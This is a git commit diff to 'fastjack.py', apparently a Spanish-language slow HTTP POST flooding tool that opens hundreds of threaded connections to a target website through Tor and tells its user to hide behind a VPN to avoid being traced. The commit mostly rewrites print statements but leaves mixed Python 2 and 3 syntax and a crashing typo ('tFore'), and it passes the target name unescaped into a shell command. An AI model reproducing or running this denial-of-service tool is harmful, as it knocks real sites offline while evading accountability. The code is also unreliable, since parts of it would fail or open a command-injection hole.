cd488a1f2126b1dfc59640dee85519612015c547
neo-jack-official <59382524+neo-jack-official@users.noreply.github.com>
2020-01-19 15:44:53 -0300

    Importante UPDATE
    Mejora de Compatibilidad con otras distribuciones Linux.
    Corrección de Errores (print, urllib2 y exceso de solicitudes)

--- fastjack.py
+++ fastjack.py
@@ -14,12 +14,13 @@ import socks
 import requests 
 import string
 import terminal
-from colorama import Fore, Back, Style 
 import urllib2 
+#import re
+#import json
+from colorama import Fore, Back, Style 
 from threading import Thread
 from urllib2 import urlopen
-import re
-import json
+
 
 global stop_now
 global term
@@ -84,7 +85,7 @@ class httpPost(Thread):
                 self.running = False
                 break
             p = random.choice(string.letters + string.digits)
-            print Fore.GREEN + Style.BRIGHT + "Publicado: ("+ Style.RESET_ALL + Fore.RED + Style.BRIGHT + " %s " % p + Style.RESET_ALL + Fore.GREEN + Style.BRIGHT + ")" + Style.RESET_ALL
+            print(Fore.GREEN + Style.BRIGHT + "Publicado: ("+ Style.RESET_ALL + Fore.RED + Style.BRIGHT + " %s " % p + Style.RESET_ALL + Fore.GREEN + Style.BRIGHT + ")" + Style.RESET_ALL)
             self.socks.send(p)
             time.sleep(random.uniform(0.1, 3))
 	
@@ -97,12 +98,12 @@ class httpPost(Thread):
                     if self.tor:     
                         self.socks.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
                     self.socks.connect((self.host, self.port))
-                    print Fore.GREEN + Style.BRIGHT + "* Conectado Cliente a TOR. " + Style.RESET_ALL
+                    print(tFore.GREEN + Style.BRIGHT + "* Conectado Cliente a TOR. " + Style.RESET_ALL)
                     break
                 except Exception, e:
                     if e.args[0] == 106 or e.args[0] == 60:
                         break
-                    print Fore.RED + Style.BRIGHT + "* Error al Conectar Cliente. " + Style.RESET_ALL
+                    print(Fore.RED + Style.BRIGHT + "* Error al Conectar Cliente. " + Style.RESET_ALL)
                     time.sleep(1)
                     continue
 	
@@ -111,7 +112,7 @@ class httpPost(Thread):
                     self._send_http_post()
                 except Exception, e:
                     if e.args[0] == 32 or e.args[0] == 104:
-                        print Fore.YELLOW + Style.BRIGHT + "* Re-Conectando Cliente. " + Style.RESET_ALL
+                        print(Fore.YELLOW + Style.BRIGHT + "* Re-Conectando Cliente. " + Style.RESET_ALL)
 
                         self.socks = socks.socksocket()
                         break
@@ -119,16 +120,16 @@ class httpPost(Thread):
                     pass
 
 def usage():
-    print Back.RED + Fore.GREEN + Style.BRIGHT + "python fastjack.py -t <web> [-r <Clientes> -p <Puerto> -T -h]" + Style.RESET_ALL
-    print " -t / --web: <Web | IP>"
-    print " -r / --clientes: <Numero de Clientes> Defecto: 256"
-    print " -p / --puerto : <Puerto Web> Defecto: 80"
-    print " -T / --tor: Enable anonymising through tor on 127.0.0.1:9050"
-    print " -h : Muestra esta Ayuda\n" 
-    print Back.RED + Fore.GREEN + Style.BRIGHT + "Ej. python fastjack.py -t www.ejemplo.com" + Style.RESET_ALL
-    print Back.RED + Fore.GREEN + Style.BRIGHT + "Ej. python fastjack.py -t www.ejemplo.com -T" + Style.RESET_ALL
-    print Back.RED + Fore.GREEN + Style.BRIGHT + "Ej. python fastjack.py -t www.ejemplo.com -r 256 -p 80" + Style.RESET_ALL
-    print "\n"
+    print(Back.RED + Fore.GREEN + Style.BRIGHT + "python fastjack.py -t <web> [-r <Clientes> -p <Puerto> -T -h]" + Style.RESET_ALL)
+    print(" -t / --web: <Web | IP>")
+    print(" -r / --clientes: <Numero de Clientes> Defecto: 256")
+    print(" -p / --puerto : <Puerto Web> Defecto: 80")
+    print(" -T / --tor: Enable anonymising through tor on 127.0.0.1:9050")
+    print(" -h : Muestra esta Ayuda\n")
+    print(Back.RED + Fore.GREEN + Style.BRIGHT + "Ej. python fastjack.py -t www.ejemplo.com" + Style.RESET_ALL)
+    print(Back.RED + Fore.GREEN + Style.BRIGHT + "Ej. python fastjack.py -t www.ejemplo.com -T" + Style.RESET_ALL)
+    print(Back.RED + Fore.GREEN + Style.BRIGHT + "Ej. python fastjack.py -t www.ejemplo.com -r 256 -p 80" + Style.RESET_ALL)
+    print("\n")
 
 tor = True
 if tor is True:
@@ -172,26 +173,26 @@ def main(argv):
         usage()
         sys.exit(-1)
 
-    print Back.CYAN +  Style.BRIGHT + "Verificando Seguridad. " + Style.RESET_ALL
-    print Fore.GREEN + Style.BRIGHT + "Tu Host Actual es: " + socket.gethostbyname(socket.gethostname()) + Style.RESET_ALL
+    print(Back.CYAN +  Style.BRIGHT + "Verificando Seguridad. " + Style.RESET_ALL)
+    print(Fore.GREEN + Style.BRIGHT + "Tu Host Actual es: " + socket.gethostbyname(socket.gethostname()) + Style.RESET_ALL)
 
     if tor is True:
-        print Fore.GREEN + Style.BRIGHT + "Conexion TOR: " + Style.RESET_ALL + Back.GREEN + "Activada" + Style.RESET_ALL
-        print Fore.GREEN + Style.BRIGHT + "Nueva Conexion IP-TOR: "+ Style.RESET_ALL + Back.MAGENTA + Fore.YELLOW + Style.BRIGHT + tor_ip + Style.RESET_ALL
+        print(Fore.GREEN + Style.BRIGHT + "Conexion TOR: " + Style.RESET_ALL + Back.GREEN + "Activada" + Style.RESET_ALL)
+        print(Fore.GREEN + Style.BRIGHT + "Nueva Conexion IP-TOR: "+ Style.RESET_ALL + Back.MAGENTA + Fore.YELLOW + Style.BRIGHT + tor_ip + Style.RESET_ALL)
         torstatus = "-T"
 
     if tor is False:
-        print Fore.GREEN + Style.BRIGHT + "Conexion TOR: " + Style.RESET_ALL + Back.RED + "Desactivado"+ Style.RESET_ALL + Fore.GREEN + Style.BRIGHT + " o " + Style.RESET_ALL + Back.RED + "NO Encontrada" + Style.RESET_ALL
+        print(Fore.GREEN + Style.BRIGHT + "Conexion TOR: " + Style.RESET_ALL + Back.RED + "Desactivado"+ Style.RESET_ALL + Fore.GREEN + Style.BRIGHT + " o " + Style.RESET_ALL + Back.RED + "NO Encontrada" + Style.RESET_ALL)
         ipcheck_url2 = 'http://canihazip.com/s' 
         torstatus = "-F"
         try:
             regular_ip = requests.get(ipcheck_url2) 
             regular_ip = str(regular_ip.text) 
-            print Fore.GREEN + Style.BRIGHT + "Tu IP Externo es: "+ Style.RESET_ALL + Back.MAGENTA + Fore.YELLOW + Style.BRIGHT + regular_ip + Style.RESET_ALL
-            print Back.MAGENTA + Fore.YELLOW + Style.BRIGHT + "Utilice siempre una conexion VPN, o su ubicacion podria ser rastreada.." + Style.RESET_ALL
-            print Fore.YELLOW + Style.BRIGHT + "Si usted cuenta con TOR NETWORK:" + Style.RESET_ALL
-            print Fore.WHITE + Style.BRIGHT + "Vea el siguiente ejemplo para Activarlo." + Style.RESET_ALL
-            print Fore.RED + Style.BRIGHT + "Ej: " + Style.RESET_ALL + Fore.YELLOW + Style.BRIGHT + "python fastjack -t <web> -T" + Style.RESET_ALL
+            print(Fore.GREEN + Style.BRIGHT + "Tu IP Externo es: "+ Style.RESET_ALL + Back.MAGENTA + Fore.YELLOW + Style.BRIGHT + regular_ip + Style.RESET_ALL)
+            print(Back.MAGENTA + Fore.YELLOW + Style.BRIGHT + "Utilice siempre una conexion VPN, o su ubicacion podria ser rastreada.." + Style.RESET_ALL)
+            print(Fore.YELLOW + Style.BRIGHT + "Si usted cuenta con TOR NETWORK:" + Style.RESET_ALL)
+            print(Fore.WHITE + Style.BRIGHT + "Vea el siguiente ejemplo para Activarlo." + Style.RESET_ALL)
+            print(Fore.RED + Style.BRIGHT + "Ej: " + Style.RESET_ALL + Fore.YELLOW + Style.BRIGHT + "python fastjack -t <web> -T" + Style.RESET_ALL)
             click.confirm('..................... ' +Back.RED + Fore.GREEN + Style.BRIGHT +'Quieres Continuar?' + Style.RESET_ALL, abort=True)
         except requests.exceptions.RequestException as e:
             sys.exit(0)
@@ -199,21 +200,20 @@ def main(argv):
 ############################### La siguiente linea Activa o Descativa HostJack-Checker
     os.system("gnome-terminal -- python hostjack-checker.py " + target + " " + torstatus)
 ###############################
-    print Back.CYAN +  Style.BRIGHT + "Verificando Estado del Servidor" + Style.RESET_ALL
+    print(Back.CYAN +  Style.BRIGHT + "Verificando Estado del Servidor" + Style.RESET_ALL)
     resultado = check_url("http://" + target)
     if resultado == True:
-       print Fore.GREEN + Style.BRIGHT + "Servidor" + Style.RESET_ALL + Fore.RED + Style.BRIGHT + " %s " % (target) + Style.RESET_ALL + Fore.GREEN + Style.BRIGHT + ": " + Style.RESET_ALL + Back.GREEN + "Operando " + Style.RESET_ALL
-       print Fore.GREEN + Style.BRIGHT + "NOTA: " + Style.RESET_ALL + Fore.YELLOW + Style.BRIGHT + "Todo parece en orden, comencemos... " + Style.RESET_ALL
+       print(Fore.GREEN + Style.BRIGHT + "Servidor" + Style.RESET_ALL + Fore.RED + Style.BRIGHT + " %s " % (target) + Style.RESET_ALL + Fore.GREEN + Style.BRIGHT + ": " + Style.RESET_ALL + Back.GREEN + "Operando " + Style.RESET_ALL)
+       print(Fore.GREEN + Style.BRIGHT + "NOTA: " + Style.RESET_ALL + Fore.YELLOW + Style.BRIGHT + "Todo parece en orden, comencemos... " + Style.RESET_ALL)
        time.sleep(3) 
 
     if not resultado == True:
-       print Fore.GREEN + Style.BRIGHT + "Servidor" + Style.RESET_ALL + Fore.RED + Style.BRIGHT + " %s " % (target) + Style.RESET_ALL + Fore.GREEN + Style.BRIGHT + ": " + Style.RESET_ALL + Back.RED +  "No Disponible " + Style.RESET_ALL
-       print Fore.GREEN + Style.BRIGHT + "NOTA: " + Style.RESET_ALL + Fore.YELLOW + Style.BRIGHT + "EL SERVIDOR" + Style.RESET_ALL + Fore.RED + Style.BRIGHT + " %s "  % (target) + Style.RESET_ALL + Fore.YELLOW + Style.BRIGHT + "PARECE NO ESTAR DISPONIBLE... " + Style.RESET_ALL
-       print Fore.GREEN + Style.BRIGHT + "NOTA: " + Style.RESET_ALL + Fore.YELLOW + Style.BRIGHT + "Si quiere una mayor eficacia, por favor confirme con (" + Style.RESET_ALL + Fore.GREEN + Style.BRIGHT + "y" + Style.RESET_ALL + Fore.YELLOW + Style.BRIGHT + ")." + Style.RESET_ALL
-       print 
+       print(Fore.GREEN + Style.BRIGHT + "Servidor" + Style.RESET_ALL + Fore.RED + Style.BRIGHT + " %s " % (target) + Style.RESET_ALL + Fore.GREEN + Style.BRIGHT + ": " + Style.RESET_ALL + Back.RED +  "No Disponible " + Style.RESET_ALL)
+       print(Fore.GREEN + Style.BRIGHT + "NOTA: " + Style.RESET_ALL + Fore.YELLOW + Style.BRIGHT + "EL SERVIDOR" + Style.RESET_ALL + Fore.RED + Style.BRIGHT + " %s "  % (target) + Style.RESET_ALL + Fore.YELLOW + Style.BRIGHT + "PARECE NO ESTAR DISPONIBLE... " + Style.RESET_ALL)
+       print(Fore.GREEN + Style.BRIGHT + "NOTA: " + Style.RESET_ALL + Fore.YELLOW + Style.BRIGHT + "Si quiere una mayor eficacia, por favor confirme con (" + Style.RESET_ALL + Fore.GREEN + Style.BRIGHT + "y" + Style.RESET_ALL + Fore.YELLOW + Style.BRIGHT + ")." + Style.RESET_ALL)      
        click.confirm('..................... ' +Back.RED + Fore.GREEN + Style.BRIGHT +'Quieres Continuar?' + Style.RESET_ALL, abort=True)
-    print Back.GREEN + Style.BRIGHT + "Objetivo:" + Style.RESET_ALL + Back.RED +  " %s " % (target) + Style.RESET_ALL + Back.GREEN + "Puerto:" + Style.RESET_ALL + Back.RED + " %d " % (port) + Style.RESET_ALL
-    print Back.GREEN + Style.BRIGHT + " * Clientes:" + Style.RESET_ALL + Back.RED + " %d " % (threads) + Style.RESET_ALL
+    print(Back.GREEN + Style.BRIGHT + "Objetivo:" + Style.RESET_ALL + Back.RED +  " %s " % (target) + Style.RESET_ALL + Back.GREEN + "Puerto:" + Style.RESET_ALL + Back.RED + " %d " % (port) + Style.RESET_ALL)
+    print(Back.GREEN + Style.BRIGHT + " * Clientes:" + Style.RESET_ALL + Back.RED + " %d " % (threads) + Style.RESET_ALL)
     rthreads = []
     for i in range(threads):
         t = httpPost(target, port, tor)
@@ -224,7 +224,7 @@ def main(argv):
         try:
             rthreads = [t.join(1) for t in rthreads if t is not None and t.isAlive()]
         except KeyboardInterrupt:
-            print "\nCerrando Clientes...\n"
+            print("\nCerrando Clientes...\n")
             for t in rthreads:
                 stop_now = True
                 t.running = False
